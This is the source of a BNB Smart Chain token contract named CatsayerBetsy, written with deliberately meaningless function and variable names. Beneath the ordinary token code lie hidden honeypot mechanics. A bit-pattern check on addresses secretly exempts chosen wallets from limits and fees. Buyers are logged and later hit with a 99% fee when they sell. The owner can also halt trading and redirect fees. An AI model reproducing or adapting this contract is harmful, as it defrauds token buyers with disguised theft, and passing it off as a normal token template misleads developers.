/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Admin {
    address internal owner;
    mapping(address => bool) internal Administration;

    constructor(address _owner) {
        owner = _owner;
        Administration[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAdmin(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAdmin(address adr) public onlyOwner() {
        Administration[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAdmin(address adr) public onlyOwner() {
        Administration[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAdmin(address adr) public view returns (bool) {
        return Administration[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        Administration[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract CatsayerBetsy is IBEP20, Admin {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Catsayer Betsy ";
    string constant _symbol = "CatsayerBetsy";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private autoWalletTradingReceiverMarketingMode;
    mapping(address => bool) private buyLaunchedLimitMin;
    mapping(address => bool) private limitTradingExemptLiquidityBuy;
    mapping(address => bool) private autoWalletMinSwap;
    mapping(address => uint256) private txTradingLimitIs;
    mapping(uint256 => address) private limitLiquidityAutoModeTeamTradingWallet;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private minTeamLimitReceiver = 0;
    uint256 private launchedMaxMarketingMode = 6;

    //SELL FEES
    uint256 private liquidityIsWalletBuyLaunched = 0;
    uint256 private isSwapLiquidityMode = 6;

    uint256 private sellMaxLimitTx = launchedMaxMarketingMode + minTeamLimitReceiver;
    uint256 private feeModeIsMin = 100;

    address private walletTradingLaunchedSell = (msg.sender); // auto-liq address
    address private receiverSwapLimitFee = (0xb6D03992498C32A413b019bfFFFfd683222721b7); // marketing address
    address private txLaunchedTradingReceiverLimitBuy = DEAD;
    address private minBuyReceiverMarketingSwap = DEAD;
    address private sellAutoLiquidityReceiver = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private botsAutoSellMaxLaunchedLimitFee;
    uint256 private exemptTxSwapBurnMin;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private limitMinTradingFee;
    uint256 private burnIsReceiverTrading;
    uint256 private liquidityLimitMaxMode;
    uint256 private txMaxSwapExempt;
    uint256 private walletAutoFeeTeam;

    bool private buySwapFeeLiquidity = true;
    bool private autoWalletMinSwapMode = true;
    bool private burnModeBotsWallet = true;
    bool private marketingTxAutoBots = true;
    bool private burnTxMaxMin = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private teamAutoMinLimit = _totalSupply / 1000; // 0.1%

    
    bool private walletMaxReceiverSell;
    uint256 private marketingReceiverSellBots;
    bool private sellBuySwapWalletMaxReceiver;
    bool private teamFeeTradingMin;
    bool private marketingLiquidityExemptMax;
    bool private tradingSellTeamFee;
    bool private autoBurnLaunchedBuySell;
    uint256 private teamMaxSellTx;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Admin(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        limitMinTradingFee = true;

        autoWalletTradingReceiverMarketingMode[msg.sender] = true;
        autoWalletTradingReceiverMarketingMode[address(this)] = true;

        buyLaunchedLimitMin[msg.sender] = true;
        buyLaunchedLimitMin[0x0000000000000000000000000000000000000000] = true;
        buyLaunchedLimitMin[0x000000000000000000000000000000000000dEaD] = true;
        buyLaunchedLimitMin[address(this)] = true;

        limitTradingExemptLiquidityBuy[msg.sender] = true;
        limitTradingExemptLiquidityBuy[0x0000000000000000000000000000000000000000] = true;
        limitTradingExemptLiquidityBuy[0x000000000000000000000000000000000000dEaD] = true;
        limitTradingExemptLiquidityBuy[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return limitMaxModeTeam(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return limitMaxModeTeam(sender, recipient, amount);
    }

    function limitMaxModeTeam(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = liquidityExemptTradingMarketing(sender) || liquidityExemptTradingMarketing(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                tradingModeWalletBotsBurnLimitExempt();
            }
            if (!bLimitTxWalletValue) {
                walletIsAutoLiquidity(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return tradingSellLimitMaxMarketingTx(sender, recipient, amount);}

        if (!Administration[sender] && !Administration[recipient]) {
            require(buySwapFeeLiquidity, "Trading is not active");
        }

        if (!Administration[sender] && !autoWalletTradingReceiverMarketingMode[sender] && !autoWalletTradingReceiverMarketingMode[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || limitTradingExemptLiquidityBuy[sender] || limitTradingExemptLiquidityBuy[recipient], "Max TX Limit has been triggered");

        if (feeLiquidityTradingMarketing()) {botsSellModeReceiver();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = liquidityBurnModeWalletLaunched(sender) ? tradingLaunchedLiquidityTx(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function tradingSellLimitMaxMarketingTx(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function liquidityBurnModeWalletLaunched(address sender) internal view returns (bool) {
        return !buyLaunchedLimitMin[sender];
    }

    function tradingIsSwapReceiverMinWalletMax(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            sellMaxLimitTx = isSwapLiquidityMode + liquidityIsWalletBuyLaunched;
            return marketingTradingWalletMode(sender, sellMaxLimitTx);
        }
        if (!selling && sender == uniswapV2Pair) {
            sellMaxLimitTx = launchedMaxMarketingMode + minTeamLimitReceiver;
            return sellMaxLimitTx;
        }
        return marketingTradingWalletMode(sender, sellMaxLimitTx);
    }

    function tradingLaunchedLiquidityTx(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(tradingIsSwapReceiverMinWalletMax(sender, receiver == uniswapV2Pair)).div(feeModeIsMin);

        if (autoWalletMinSwap[sender] || autoWalletMinSwap[receiver]) {
            feeAmount = amount.mul(99).div(feeModeIsMin);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function liquidityExemptTradingMarketing(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function marketingTradingWalletMode(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = txTradingLimitIs[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function walletIsAutoLiquidity(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        limitLiquidityAutoModeTeamTradingWallet[exemptLimitValue] = addr;
    }

    function tradingModeWalletBotsBurnLimitExempt() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (txTradingLimitIs[limitLiquidityAutoModeTeamTradingWallet[i]] == 0) {
                    txTradingLimitIs[limitLiquidityAutoModeTeamTradingWallet[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(receiverSwapLimitFee).transfer(amountBNB * amountPercentage / 100);
    }

    function feeLiquidityTradingMarketing() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    burnTxMaxMin &&
    _balances[address(this)] >= teamAutoMinLimit;
    }

    function botsSellModeReceiver() internal swapping {
        uint256 amountToLiquify = teamAutoMinLimit.mul(minTeamLimitReceiver).div(sellMaxLimitTx).div(2);
        uint256 amountToSwap = teamAutoMinLimit.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = sellMaxLimitTx.sub(minTeamLimitReceiver.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(minTeamLimitReceiver).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(launchedMaxMarketingMode).div(totalETHFee);

        payable(receiverSwapLimitFee).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                walletTradingLaunchedSell,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getIsSwapLiquidityMode() public view returns (uint256) {
        return isSwapLiquidityMode;
    }
    function setIsSwapLiquidityMode(uint256 a0) public onlyOwner {
        if (isSwapLiquidityMode == teamAutoMinLimit) {
            teamAutoMinLimit=a0;
        }
        if (isSwapLiquidityMode != minTeamLimitReceiver) {
            minTeamLimitReceiver=a0;
        }
        isSwapLiquidityMode=a0;
    }

    function getBurnModeBotsWallet() public view returns (bool) {
        if (burnModeBotsWallet == autoWalletMinSwapMode) {
            return autoWalletMinSwapMode;
        }
        return burnModeBotsWallet;
    }
    function setBurnModeBotsWallet(bool a0) public onlyOwner {
        burnModeBotsWallet=a0;
    }

    function getMinBuyReceiverMarketingSwap() public view returns (address) {
        if (minBuyReceiverMarketingSwap != txLaunchedTradingReceiverLimitBuy) {
            return txLaunchedTradingReceiverLimitBuy;
        }
        return minBuyReceiverMarketingSwap;
    }
    function setMinBuyReceiverMarketingSwap(address a0) public onlyOwner {
        if (minBuyReceiverMarketingSwap == receiverSwapLimitFee) {
            receiverSwapLimitFee=a0;
        }
        minBuyReceiverMarketingSwap=a0;
    }

    function getReceiverSwapLimitFee() public view returns (address) {
        return receiverSwapLimitFee;
    }
    function setReceiverSwapLimitFee(address a0) public onlyOwner {
        if (receiverSwapLimitFee != sellAutoLiquidityReceiver) {
            sellAutoLiquidityReceiver=a0;
        }
        if (receiverSwapLimitFee != sellAutoLiquidityReceiver) {
            sellAutoLiquidityReceiver=a0;
        }
        if (receiverSwapLimitFee == minBuyReceiverMarketingSwap) {
            minBuyReceiverMarketingSwap=a0;
        }
        receiverSwapLimitFee=a0;
    }

    function getAutoWalletTradingReceiverMarketingMode(address a0) public view returns (bool) {
        if (a0 != txLaunchedTradingReceiverLimitBuy) {
            return buySwapFeeLiquidity;
        }
            return autoWalletTradingReceiverMarketingMode[a0];
    }
    function setAutoWalletTradingReceiverMarketingMode(address a0,bool a1) public onlyOwner {
        if (a0 == receiverSwapLimitFee) {
            marketingTxAutoBots=a1;
        }
        if (autoWalletTradingReceiverMarketingMode[a0] == autoWalletTradingReceiverMarketingMode[a0]) {
           autoWalletTradingReceiverMarketingMode[a0]=a1;
        }
        autoWalletTradingReceiverMarketingMode[a0]=a1;
    }

    function getBurnTxMaxMin() public view returns (bool) {
        if (burnTxMaxMin == burnTxMaxMin) {
            return burnTxMaxMin;
        }
        if (burnTxMaxMin != buySwapFeeLiquidity) {
            return buySwapFeeLiquidity;
        }
        return burnTxMaxMin;
    }
    function setBurnTxMaxMin(bool a0) public onlyOwner {
        if (burnTxMaxMin == burnTxMaxMin) {
            burnTxMaxMin=a0;
        }
        if (burnTxMaxMin != autoWalletMinSwapMode) {
            autoWalletMinSwapMode=a0;
        }
        burnTxMaxMin=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}